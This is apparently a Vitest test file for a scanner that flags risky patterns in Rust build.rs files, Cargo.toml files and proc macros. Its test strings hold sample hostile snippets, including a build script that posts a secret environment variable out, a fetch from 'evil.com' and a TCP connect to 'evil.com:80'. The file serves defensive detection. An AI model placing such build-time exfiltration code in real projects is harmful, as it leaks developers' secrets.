import { describe, it, expect } from "vitest";
import { scanCargoContent, isCargoFile, CARGO_PATTERNS } from "../cargo-scanner.js";

describe("Cargo/Rust Scanner", () => {
  it("should identify Cargo-related files", () => {
    expect(isCargoFile("Cargo.toml")).toBe(true);
    expect(isCargoFile("Cargo.lock")).toBe(true);
    expect(isCargoFile("build.rs")).toBe(true);
    expect(isCargoFile("package.json")).toBe(false);
    expect(isCargoFile("main.rs")).toBe(false);
  });

  describe("build.rs scanning", () => {
    it("should detect Command::new in build.rs", () => {
      const content = 'fn main() {\n    Command::new("gcc").arg("lib.c").status();\n}';
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_EXEC")).toBe(true);
    });

    it("should detect network access in build.rs", () => {
      const content = 'fn main() {\n    let resp = reqwest::blocking::get("https://evil.com/lib.a");\n}';
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_NETWORK")).toBe(true);
    });

    it("should detect env var exfiltration in build.rs", () => {
      const content = 'fn main() {\n    let key = env::var("SECRET").unwrap(); let _ = reqwest::blocking::Client::new().post(url).body(key).send();\n}';
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings.some((f) => f.rule === "CARGO_BUILD_RS_ENV_EXFIL")).toBe(true);
    });

    it("should not flag clean build.rs", () => {
      const content = [
        "fn main() {",
        '    println!("cargo:rerun-if-changed=build.rs");',
        '    println!("cargo:rustc-link-lib=static=mylib");',
        "}",
      ].join("\n");
      const findings = scanCargoContent(content, "build.rs", "build");
      expect(findings).toHaveLength(0);
    });
  });

  describe("Cargo.toml scanning", () => {
    it("should detect git dependencies", () => {
      const content = '[dependencies]\nfoo = { git = "https://sketchy-host.com/foo.git" }';
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_GIT_DEPENDENCY")).toBe(true);
    });

    it("should not flag well-known git repos", () => {
      const content = '[dependencies]\ntokio = { git = "https://github.com/tokio-rs/tokio" }';
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_GIT_DEPENDENCY")).toBe(false);
    });

    it("should detect [patch] section", () => {
      const content = '[patch.crates-io]\nfoo = { path = "../my-fork" }';
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_PATCH_SECTION")).toBe(true);
    });

    it("should detect [replace] section", () => {
      const content = "[replace]\n'foo:0.1.0' = { path = '../my-fork' }";
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings.some((f) => f.rule === "CARGO_REPLACE_SECTION")).toBe(true);
    });

    it("should not flag clean Cargo.toml", () => {
      const content = [
        "[package]",
        'name = "my-app"',
        'version = "0.1.0"',
        "",
        "[dependencies]",
        'serde = "1.0"',
        'tokio = { version = "1", features = ["full"] }',
      ].join("\n");
      const findings = scanCargoContent(content, "Cargo.toml", "toml");
      expect(findings).toHaveLength(0);
    });
  });

  describe("proc-macro scanning", () => {
    it("should detect file system access in proc macros", () => {
      const content = 'use std::fs;\nfn helper() { fs::read("secret.txt"); }';
      const findings = scanCargoContent(content, "src/lib.rs", "proc-macro");
      expect(findings.some((f) => f.rule === "CARGO_PROC_MACRO_FS")).toBe(true);
    });

    it("should detect network access in proc macros", () => {
      const content = 'use std::net::TcpStream;\nfn connect() { TcpStream::connect("evil.com:80"); }';
      const findings = scanCargoContent(content, "src/lib.rs", "proc-macro");
      expect(findings.some((f) => f.rule === "CARGO_PROC_MACRO_NETWORK")).toBe(true);
    });
  });

  it("should include line numbers in findings", () => {
    const content = "[dependencies]\n# comment\n[patch.crates-io]\nfoo = { path = '.' }";
    const findings = scanCargoContent(content, "Cargo.toml", "toml");
    expect(findings.find((f) => f.rule === "CARGO_PATCH_SECTION")?.line).toBe(3);
  });

  it("should have patterns array", () => {
    expect(CARGO_PATTERNS.length).toBeGreaterThan(5);
    for (const p of CARGO_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
